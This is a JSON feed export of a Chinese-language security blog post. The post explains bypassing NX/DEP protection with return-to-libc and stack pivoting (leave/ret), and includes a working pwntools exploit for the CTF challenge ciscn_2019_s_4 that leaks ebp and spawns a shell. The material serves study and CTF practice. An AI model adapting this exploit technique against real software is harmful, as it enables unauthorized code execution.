{
    "version": "https://jsonfeed.org/version/1",
    "title": "alazymachine • All posts by \"bypass\" tag",
    "description": "",
    "home_page_url": "https://alazymechnaic.github.io",
    "items": [
        {
            "id": "https://alazymechnaic.github.io/2023/05/02/bypass-nx/",
            "url": "https://alazymechnaic.github.io/2023/05/02/bypass-nx/",
            "title": "bypass-NX",
            "date_published": "2023-05-02T06:56:58.000Z",
            "content_html": "<h2 id=\"Bypass-NX（DEP）\"><a href=\"#Bypass-NX（DEP）\" class=\"headerlink\" title=\"Bypass NX（DEP）\"></a>Bypass NX（DEP）</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>​\t栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的<strong>SIGSEGV</strong> 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。</p>\n<h3 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h3><p>​\t既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（<strong>如果在开启了NX的情况下如何进行单字节溢出的利用</strong>）。</p>\n<p><strong>least privilege &amp; seteuid(getuid())</strong></p>\n<p>​\t在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">seteuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">system</span><span class=\"token punctuation\">(</span>“sh”<span class=\"token punctuation\">)</span>\n<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>但是存在问题，setuid的参数是\\x00，但是strcpy在遇到\\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：</p>\n<ul>\n<li>ESP lifting (ESP抬升)</li>\n<li>Frame Faking(栈帧伪造)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=\">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></li>\n</ul>\n<p>其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">leave:\n        move esp,ebp ; 恢复栈顶指针\n        pop ebp ;(esp=esp+4)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">esp,ebp --&gt; old_ebp\n        --&gt; ret_addr\n        --&gt; arg1 :此处是指向system字符串参数的指针\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<hr>\n<h3 id=\"例题-ciscn-2019-s-4\"><a href=\"#例题-ciscn-2019-s-4\" class=\"headerlink\" title=\"例题 ciscn_2019_s_4\"></a>例题 ciscn_2019_s_4</h3><p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png\" alt=\"image-20230504193243253\"></p>\n<p>题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png\" alt=\"image-20230504193612815\"></p>\n<p>在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置\n...\nebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此\n\t   [ret_add] ; 记录当前的返回地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">inst: \n\tmov esp,ebp\n----------------------------------------------\nebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此\n\t   [new_ret_addr] ; 记录当前的返回地址\n----------------------------------------------\ninst: \n\tpop ebp\n----------------------------------------------\nebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论\nesp -&gt; [new_ret_addr] ; 记录当前的返回地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。</p>\n<pre class=\"line-numbers language-assembly\" data-language=\"assembly\"><code class=\"language-assembly\">inst: \n\tmov esp,ebp\n----------------------------------------------\nebp,esp = buff_ ; 执行结束后完成将esp的抬升\n----------------------------------------------\ninst: \n\tpop ebp\n----------------------------------------------\nesp = buff_ ;  \nebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是<strong>printf</strong>本身在输出的时候接收一个字符串指针，并自动执行到\\x00的位置结束。因此可以利用该机制进行ebp的泄露。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nsh <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_s_4'</span><span class=\"token punctuation\">)</span>\nelf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_s_4'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">(</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t静态查找leave ret指令地址\n'''</span>\nsystem_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x8048400</span>\nleave_ret_addr<span class=\"token operator\">=</span><span class=\"token number\">0x080484B8</span>\nret_addr <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t第一次直接构造和buff长度相同的输入，printf时会输出后续内容\n'''</span>\npayload <span class=\"token operator\">=</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x28</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'name?\\n'</span><span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t接收泄露的ebp输出\n'''</span>\nsh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nebp <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token triple-quoted-string string\">'''\n\t这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38\n'''</span>\nfake_ebp <span class=\"token operator\">=</span> ebp <span class=\"token operator\">-</span><span class=\"token number\">0x38</span>\n<span class=\"token triple-quoted-string string\">'''\n\t构造第二次输入的payload\n'''</span>\npayload<span class=\"token operator\">=</span>p32<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># ret addr</span>\npayload<span class=\"token operator\">+=</span><span class=\"token string\">b'aaaa'</span> <span class=\"token comment\"># junk ret addr 用于模拟call system时的压入返回值操作</span>\npayload<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>fake_ebp<span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span>\npayload<span class=\"token operator\">+=</span><span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token comment\"># payload</span>\npayload<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 这里对当前的栈进行补齐操作</span>\npayload<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>fake_ebp<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span>\npayload<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>leave_ret_addr<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 填入leave ret返回值</span>\nsh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nsh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nexit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意两个关键位置：</p>\n<p><strong>payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</strong></p>\n<p><strong>payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</strong></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYV90aW1lL2FydGljbGUvZGV0YWlscy8xMDYxNDI5NzE=\">https://blog.csdn.net/sea_time/article/details/106142971</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA1LzA4L2J5cGFzc2luZy1ueC1iaXQtdXNpbmctY2hhaW5lZC1yZXR1cm4tdG8tbGliYy8=\">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</span></p>\n",
            "tags": [
                "bypass"
            ]
        }
    ]
}